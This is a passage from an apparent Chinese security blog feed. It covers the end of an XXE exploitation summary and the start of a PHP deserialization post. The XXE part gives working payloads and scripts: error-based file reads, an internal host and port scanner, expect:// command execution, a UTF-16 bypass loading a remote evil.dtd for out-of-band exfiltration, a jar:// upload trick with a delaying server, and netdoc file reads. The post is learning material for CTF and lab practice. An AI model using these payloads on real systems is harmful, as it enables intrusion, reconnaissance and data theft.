class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;eval;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;error;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ELEMENT aa (bb&#x27;</span>&gt;</span></span><br><span class="hljs-meta">    %local_dtd;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>flag<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>root<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">condition</span> <span class="hljs-string">&quot;and | or | not | equal | contains | exists | subdomain-of&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">pattern</span> (%<span class="hljs-keyword">condition</span>;)&gt;</span><br></code></pre></td></tr></table></figure><h2 id="探测内网主机与端口"><a href="#探测内网主机与端口" class="headerlink" title="探测内网主机与端口"></a>探测内网主机与端口</h2><p>利用http协议和网页响应时间来判断主机存活</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">XXE</span>(<span class="hljs-params">ip,string</span>):<br>    <span class="hljs-keyword">try</span>:<br>        xml = <span class="hljs-string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot;</span> + <span class="hljs-string">&#x27;&quot;&#x27;</span> + string + <span class="hljs-string">&#x27;&quot;&#x27;</span> + <span class="hljs-string">&quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span><br>        x = requests.post(<span class="hljs-string">&#x27;http://192.168.91.134/xml.php&#x27;</span>, data=xml, headers=headers, timeout=<span class="hljs-number">5</span>).text<br>        coded_string = x.split(<span class="hljs-string">&#x27; &#x27;</span>)[-<span class="hljs-number">2</span>]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; [+]&#x27;</span>,ip,<span class="hljs-string">&#x27;Successfully Found !!!&#x27;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; [-]&#x27;</span>,ip,<span class="hljs-string">&#x27;Error Not Found !!!&#x27;</span>)<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    headers = &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;application/xml&#x27;</span>&#125;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">130</span>,<span class="hljs-number">150</span>):<br>        ip = <span class="hljs-string">&#x27;192.168.91.&#x27;</span> + <span class="hljs-built_in">str</span>(i)<br>        string = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=http://&#x27;</span> + ip + <span class="hljs-string">&#x27;/&#x27;</span><br>        XXE(ip,string)<br></code></pre></td></tr></table></figure><p>根据返回内容的不同来判断端口是否开启</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://192.168.91.149:80&quot;</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">xxe</span> (<span class="hljs-keyword">#PCDATA</span>) &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xxe</span>&gt;</span>666<span class="hljs-tag">&lt;/<span class="hljs-name">xxe</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h2><p>在安装<code>expect</code>扩展的<code>PHP</code>环境里执行系统命令</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">name</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;expect://id&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>利用<code>utf-16</code>编码绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://9b6b0b8a-f306-4372-9f2c-60abfae7b4d4.challenge.ctf.show/&#x27;</span><br>payload = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;!DOCTYPE convert [</span><br><span class="hljs-string">&lt;!ENTITY % remote SYSTEM &quot;http://vps/evil.dtd&quot;&gt;</span><br><span class="hljs-string">%remote;%int;%send;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = payload.encode(<span class="hljs-string">&#x27;utf-16&#x27;</span>)<br>rep = requests.post(url=url, data=payload)<br><span class="hljs-built_in">print</span>(rep.text)<br></code></pre></td></tr></table></figure><p>或者命令转换编码<code>iconv -f utf8 -t UTF-32LE  1.xml &gt; 2.xml</code>，<code>echo urlencode(file_get_contents(&quot;payload.xml&quot;));</code>读</p><h2 id="jar-x2F-x2F-文件上传"><a href="#jar-x2F-x2F-文件上传" class="headerlink" title="jar:&#x2F;&#x2F; 文件上传"></a>jar:&#x2F;&#x2F; 文件上传</h2><p><code>Java</code>环境下还可以利用<code>jar</code>协议上传文件</p><p><code>jar</code>协议语法，<code>jar:&#123;url&#125;!/&#123;entry&#125;</code>，<code>url</code>是文件的路径，<code>entry</code>是想要解压出来的文件</p><p>jar 协议处理文件的过程：<br>1：下载 jar&#x2F;zip 文件到临时文件中<br>2：提取出我们指定的文件<br>3：删除临时文件</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY  <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;jar:http://ip:port/1.zip!/1.php&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">convert</span>&gt;</span><span class="hljs-symbol">&amp;remote;</span><span class="hljs-tag">&lt;/<span class="hljs-name">convert</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当<code>1.zip</code>中没有<code>1.php</code>时，<code>java</code>解析器就会报错，说在这个临时文件中找不到这个文件，这样就得到了临时文件的路径，可以利用文件包含等漏洞去进一步利用这个文件，其原理类似于<code>php</code>的<code>phpinfo</code>临时文件包含</p><p>本地搭建一个环境测试：</p><p>main.java，部署在tomcat上，模拟一个存在xxe漏洞的网页</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.w3c.dom.Element;<br><span class="hljs-keyword">import</span> org.w3c.dom.Node;<br><span class="hljs-keyword">import</span> org.w3c.dom.NodeList;<br><span class="hljs-keyword">import</span> org.xml.sax.InputSource;<br><span class="hljs-keyword">import</span> org.w3c.dom.Document;<br><span class="hljs-keyword">import</span> org.xml.sax.SAXException;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> javax.xml.parsers.DocumentBuilder;<br><span class="hljs-keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;<br><span class="hljs-keyword">import</span> javax.xml.parsers.ParserConfigurationException;<br><br><span class="hljs-meta">@WebServlet(&quot;/xxe&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">main</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">parmeter</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;poc&quot;</span>);<br><br>        <span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span> DocumentBuilderFactory.newInstance();<br>        <span class="hljs-type">DocumentBuilder</span> <span class="hljs-variable">db</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            db = dbf.newDocumentBuilder();<br>        &#125; <span class="hljs-keyword">catch</span> (ParserConfigurationException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>        <span class="hljs-type">StringReader</span> <span class="hljs-variable">sr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(parmeter);<br>        <span class="hljs-type">InputSource</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(sr);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Document</span> <span class="hljs-variable">document</span> <span class="hljs-operator">=</span> db.parse(is);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>            <span class="hljs-type">Element</span> <span class="hljs-variable">element</span> <span class="hljs-operator">=</span> document.getDocumentElement();<br>            <span class="hljs-type">NodeList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> element.getChildNodes();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">iloop</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; iloop &lt; list.getLength(); iloop++) &#123;<br>                <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> list.item(iloop);<br>                <span class="hljs-keyword">if</span> (node.getNodeType() == Node.ELEMENT_NODE) &#123;<br>                    writer.write(node.getNodeName() + <span class="hljs-string">&quot;：&quot;</span><br>                            + node.getTextContent());<br>                &#125;<br>            &#125;<br>            writer.close();<br>        &#125; <span class="hljs-keyword">catch</span> (SAXException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-5.png"></p><p>再用python起个http服务，进行监听</p><p>xxe-jar.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><span class="hljs-keyword">import</span> http.client <span class="hljs-keyword">as</span> httpc<br><br>listen_host = <span class="hljs-string">&#x27;localhost&#x27;</span><br>listen_port = <span class="hljs-number">9999</span><br>jar_file = sys.argv[<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">JarRequestHandler</span>(socketserver.BaseRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):<br>        http_req = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;New connection:&#x27;</span>,self.client_address)<br>        <span class="hljs-keyword">while</span> <span class="hljs-string">b&#x27;\r\n\r\n&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> http_req:<br>            <span class="hljs-keyword">try</span>:<br>                http_req += self.request.recv(<span class="hljs-number">4096</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Client req:\r\n&#x27;</span>,http_req.decode())<br>                jf = <span class="hljs-built_in">open</span>(jar_file, <span class="hljs-string">&#x27;rb&#x27;</span>)<br>                contents = jf.read()<br>                headers = (<span class="hljs-string">&#x27;&#x27;&#x27;HTTP/1.0 200 OK\r\n&#x27;&#x27;&#x27;</span><br>                <span class="hljs-string">&#x27;&#x27;&#x27;Content-Type: application/java-archive\r\n\r\n&#x27;&#x27;&#x27;</span>)<br>                self.request.sendall(headers.encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br>                self.request.sendall(contents[:-<span class="hljs-number">1</span>])<br>                time.sleep(<span class="hljs-number">30</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-number">30</span>)<br>                self.request.sendall(contents[-<span class="hljs-number">1</span>:])<br><br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;get error at:&quot;</span>+<span class="hljs-built_in">str</span>(e))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler)<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;waiting for connection...&#x27;</span>)<br>    server_thread = threading.Thread(target=jarserver.serve_forever)<br>    server_thread.daemon = <span class="hljs-literal">True</span><br>    server_thread.start()<br>    server_thread.join()<br></code></pre></td></tr></table></figure><p>执行<code>python xxe-jar.py evil.zip</code></p><p><code>evil.zip</code>就是要上传的文件了，不一定要是<code>zip</code>，但是因为<code>jar</code>协议会对文件进行解包操作，如果不上传<code>zip</code>格式文件在报错里是看不到临时文件路径的，所以需要先正常上传一次<code>zip</code>格式文件获取路径然后再上传其他文件</p><p>访问<code>/xxe</code>，<code>post</code>发<code>payload</code></p><p>获取路径<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-7.png"></p><p>上传文件<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-8.png"></p><p>监听情况，<code>30</code>是延时了<code>30</code>秒<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-6.png"></p><p>至于为什么要延迟，回到<code>jar</code>协议处理文件的过程，因为最后一步会删除临时文件，所以我们就要考虑如何让这个文件能更长时间的停留在我们的系统之中，解决方法是在文件结尾添加一个垃圾字符，然后发送除了最后一个字节的所有数据后进行<code>sleep</code>，这样实际上已经传完了，但是服务器以为没传完，就暂时不会删除临时文件了</p><h2 id="netdoc-协议"><a href="#netdoc-协议" class="headerlink" title="netdoc 协议"></a>netdoc 协议</h2><p><code>Java</code>中<code>netdoc</code>协议可以替代<code>file</code>协议功能，读文件，同时也可以列目录</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [</span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">creds</span> <span class="hljs-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;netdoc:///c:/windows/system.ini&quot;</span>&gt;</span></span><br><span class="hljs-meta">        ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [</span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">creds</span> <span class="hljs-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;netdoc:///var/www/html/&quot;</span>&gt;</span></span><br><span class="hljs-meta">        ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><p>参考：<br><a href="https://xz.aliyun.com/t/6887">从XML相关一步一步到XXE漏洞</a><br><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/xxe-%E6%80%BB%E7%BB%93/">XXE 总结</a><br><a href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞</a><br><a href="https://xz.aliyun.com/t/8041">从几道CTF题学习Blind XXE</a><br><a href="https://jlkl.github.io/2020/08/24/Java_03/">Java XXE 漏洞</a><br><a href="https://github.com/proudwind/javasec_study/blob/master/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-xxe.md">java代码审计-xxe</a><br><a href="https://www.cnblogs.com/SUN99bk/p/11826523.html">XML之DTD</a><br><a href="https://xi4or0uji.github.io/2018/11/29/xxe%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/#XML">xxe漏洞攻击与防御</a><br><a href="https://www.rc.sb/xxe/#%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95">XXE 漏洞总结</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;从XML到XXE&quot;&gt;&lt;a href=&quot;#从XML到XXE&quot; class=&quot;headerlink&quot; title=&quot;从XML到XXE&quot;&gt;&lt;/a&gt;从XML到XXE&lt;/h1&gt;&lt;h2 id=&quot;XML&quot;&gt;&lt;a href=&quot;#XML&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="总结" scheme="https://www.lewiserii.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.lewiserii.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="xxe" scheme="https://www.lewiserii.top/tags/xxe/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化总结</title>
    <link href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93.html"/>
    <id>https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93.html</id>
    <published>2023-02-10T04:00:00.000Z</published>
    <updated>2023-02-15T05:17:19.732Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常见的魔术方法"><a href="#常见的魔术方法" class="headerlink" title="常见的魔术方法"></a>常见的魔术方法</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__construct</span>()： 在创建对象时候初始化对象，一般用于对变量赋初值。<br><span class="hljs-title function_ invoke__">__destruct</span>()： 和构造函数相反，当对象所在函数调用完毕后执行。<br><span class="hljs-title function_ invoke__">__call</span>()： 当调用对象中不存在的方法会自动调用该方法。<br><span class="hljs-title function_ invoke__">__get</span>()： 获取对象不存在的属性时执行此函数。<br><span class="hljs-title function_ invoke__">__set</span>()： 设置对象不存在的属性时执行此函数。<br><span class="hljs-title function_ invoke__">__toString</span>()： 当对象被当做一个字符串使用时调用。<br><span class="hljs-title function_ invoke__">__sleep</span>()： 序列化对象之前就调用此方法(其返回需要一个数组)<br><span class="hljs-title function_ invoke__">__wakeup</span>()： 反序列化恢复对象之前调用该方法<br><span class="hljs-title function_ invoke__">__isset</span>()： 在不可访问的属性上调用<span class="hljs-keyword">isset</span>()或<span class="hljs-keyword">empty</span>()触发<br><span class="hljs-title function_ invoke__">__unset</span>()： 在不可访问的属性上使用<span class="hljs-keyword">unset</span>()时触发<br><span class="hljs-title function_ 